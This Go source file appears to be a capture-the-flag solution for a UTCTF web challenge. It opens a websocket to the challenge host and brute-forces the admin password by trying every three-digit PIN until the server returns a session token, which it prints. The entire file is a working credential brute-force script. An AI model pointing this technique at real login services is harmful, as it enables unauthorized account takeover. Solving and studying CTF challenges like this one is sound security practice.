package main

import (
	"fmt"
	"strings"

	"github.com/gorilla/websocket"
)

func main() {
	ws, _, err := websocket.DefaultDialer.Dial("ws://web1.utctf.live:8651/internal/ws", nil)
	if err != nil {
		panic(err)
	}
	defer ws.Close()

	ws.ReadMessage() // begin
	ws.WriteMessage(websocket.TextMessage, []byte("begin"))

	for i := 0; i < 1000; i++ {
		ws.WriteMessage(websocket.TextMessage, []byte("user admin"))
		ws.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("pass %03d", i)))

		_, m, _ := ws.ReadMessage()
		msg := string(m)
		if strings.HasPrefix(msg, "session ") {
			fmt.Println(strings.TrimPrefix(msg, "session "))
			break
		}
	}
}
